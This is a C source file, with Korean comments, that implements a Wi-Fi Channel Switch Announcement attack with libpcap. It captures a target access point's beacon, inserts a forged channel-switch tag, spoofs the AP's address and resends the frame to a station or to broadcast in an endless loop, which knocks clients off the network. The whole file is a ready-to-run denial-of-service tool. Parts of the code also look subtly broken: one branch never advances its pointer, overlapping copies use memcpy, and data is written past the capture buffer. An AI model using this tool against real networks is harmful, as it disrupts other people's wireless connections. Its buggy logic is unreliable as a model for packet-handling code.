#include <stdio.h>
#include <pcap.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define ERROR_BEACON_CAPTURE -1

typedef struct RadiotapHeader RadiotapHeader;
typedef struct Dot11FrameHeader Dot11FrameHeader;
typedef struct BeaconFrame BeaconFrame;
typedef struct Tag_param Tag_param;

#include "Frame.h"

void parse_mac(unsigned char* mac_arr, const char* mac_str);
int capture_beacon(pcap_t* handle, unsigned char** cap_frame, const char* interface, const char* ap_mac);
void generate_csa(unsigned char** dst, unsigned char* frame, int pkt_len, const char* ap_mac, const char* dst_mac);
void send_csa(pcap_t* handle, const char* interface, unsigned char* frame, int len);



int csa_attack(const char* interface, const char* ap_mac_str, const char* sta_mac_str) {

    // 0. aa:11:bb:22:cc:33 꼴의 mac주소 문자열을 byte 배열로 파싱
    uint8_t ap_mac[6];
    parse_mac(ap_mac, ap_mac_str);

    uint8_t dst_mac[6];
    if (sta_mac_str == NULL)
        memset(dst_mac, 0xff, 6); // station mac 없을 경우 목적지는 broadcast
    else
        parse_mac(dst_mac, sta_mac_str);
        
    
    for(int i=0; i<6; i++) printf("%02x ", ap_mac[i]);
    putchar('\n');
    for(int i=0; i<6; i++) printf("%02x ", dst_mac[i]);
    putchar('\n');

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    // pcap_t* handle = pcap_open_offline(interface, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return -1;
	}


    // 1. ap_mac에 해당하는 beacon frame을 캡처한다.
    puts("capturing beacon frame...");
    unsigned char* captured_frame;
    int cap_len = capture_beacon(handle, &captured_frame, interface, ap_mac);
    if (cap_len == ERROR_BEACON_CAPTURE) return -1;

    puts("success to capture beacon frame.");
    printf("cap_len: %d\n", cap_len);

    // 2. 캡처한 beacon frame의 정보를 변경한다.
    puts("adding csa tag on beacon frame.");
    unsigned char* csa_frame = calloc(cap_len + 5, 1); // 할당은 5바이트 더 해놓고
    generate_csa(&csa_frame, captured_frame, cap_len, ap_mac, dst_mac); // 원래 caplen 보내서 memmove()에 사용
    puts("success to add csa tag on beacon frame.");

    for(int i=0; i<cap_len+5; i++) {
        printf("%02x ", csa_frame[i]);
        if((i+1)%16 == 0) putchar('\n');
    }
    putchar('\n');

    // 3. 변경한 beacon frame을 broadcast 혹은 unicast로 전송한다.
    puts("start to send csa beacon frame.");
    send_csa(handle, interface, csa_frame, cap_len+5);

    pcap_close(handle);
    free(captured_frame);
    free(csa_frame);

    return 0;


}


void parse_mac(unsigned char* mac_arr, const char* mac_str) {
    int tmp[6];
    sscanf(mac_str, "%x:%x:%x:%x:%x:%x", &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]);
    for(int i=0; i<6; i++)
        mac_arr[i] = (uint8_t)tmp[i];
}


int capture_beacon(pcap_t* handle, unsigned char** cap_frame, const char* interface, const char* ap_mac) {

    // char errbuf[PCAP_ERRBUF_SIZE];
    // pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    // // pcap_t* handle = pcap_open_offline(interface, errbuf);
    // if (handle == NULL) {
    //     fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
	// 	return -1;
	// }

    struct pcap_pkthdr* header;
	const unsigned char* packet;
    while (1){
        int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return -1;
		}

        RadiotapHeader* r_hdr = packet;
        Dot11FrameHeader* frame_hdr = packet + r_hdr->length;
        // printf("%02x\n", r_hdr->present);
        // for(int i=0; i<r_hdr->length; i++) printf("%02x ", ((unsigned char*)r_hdr)[i]);
        // putchar('\n');
        // if (ntohs(frame_hdr->frame_ctl) == 0x8000) {
        //     printf("captured addr1: %02x\n", frame_hdr->addr1);
        //     printf("captured addr2: %02x\n", frame_hdr->addr2);
        // }
        
        if((ntohs(frame_hdr->frame_ctl) == 0x8000) && (strncmp(frame_hdr->addr2, ap_mac, 6) == 0)) {
            *cap_frame = calloc(header->caplen, 1);
            memcpy(*cap_frame, packet, header->caplen);
            break;
        }

    } // while (1)

    // pcap_close(handle);
    return header->caplen;

}


void generate_csa(unsigned char** dst, unsigned char* frame, int pkt_len, const char* ap_mac, const char* dst_mac) {

    RadiotapHeader* r_hdr = frame;
    // for(int i=0; i<r_hdr->length; i++) printf("%02x ", ((unsigned char*)r_hdr)[i]);
    // putchar('\n');
    memcpy(*dst, r_hdr, r_hdr->length);
    // for(int i=0; i<r_hdr->length; i++) printf("%02x ", ((unsigned char*)*dst)[i]);

    BeaconFrame* b_frame = frame + r_hdr->length;
    memcpy(b_frame->f_hdr.addr1, dst_mac, 6);
    memcpy(b_frame->f_hdr.addr2, ap_mac, 6);
    memcpy(b_frame->f_hdr.addr3, ap_mac, 6);
    memcpy(*dst + r_hdr->length, b_frame, sizeof(BeaconFrame));

    Tag_param* param = (unsigned char*)b_frame + sizeof(BeaconFrame);
    
    unsigned char* offset = param; // tag parameter 시작지점
    int set_csa = 0;

    while(param < (frame + pkt_len)) {
        if (param->tag_num < 25) {
            // printf("param tag num: %d\n", param->tag_num);
            param = (unsigned char*)param + param->tag_len + 2;
        }
        else if (param->tag_num == 25) {
            // printf("param tag num: %d\n", param->tag_num);
            uint8_t csa_param[5] = {0x25, 0x03, 0x01, 0x13, 0x03};
            memcpy(param, csa_param, 5);
        }
        else {
            if(set_csa) {
                // printf("param tag num: %d\n", param->tag_num);
                param = (unsigned char*)param + param->tag_len + 2;
            }
            else {
                // printf("param tag num: %d\n", param->tag_num);
                uint8_t csa_param[5] = {0x25, 0x03, 0x01, 0x13, 0x03}; // csa tag parameter byte
                memcpy((unsigned char*)param+5, (unsigned char*)param, (frame + pkt_len) - (unsigned char*)param);
                memcpy(param, csa_param, 5);
                set_csa = 1;
            }
            
        }

    }

    memcpy(*dst + r_hdr->length + sizeof(BeaconFrame), offset, ((unsigned char*)param - offset) + 5);

}


void send_csa(pcap_t* handle, const char* interface, unsigned char* frame, int len) {

    puts("start of send_csa()");

    while (1) {
        puts("before sendpacket()");
        pcap_sendpacket(handle, frame, len);
        puts("after sendpacket()");
        puts("send csa beacon frame");
        // usleep(1000);
        sleep(1);
    }

}
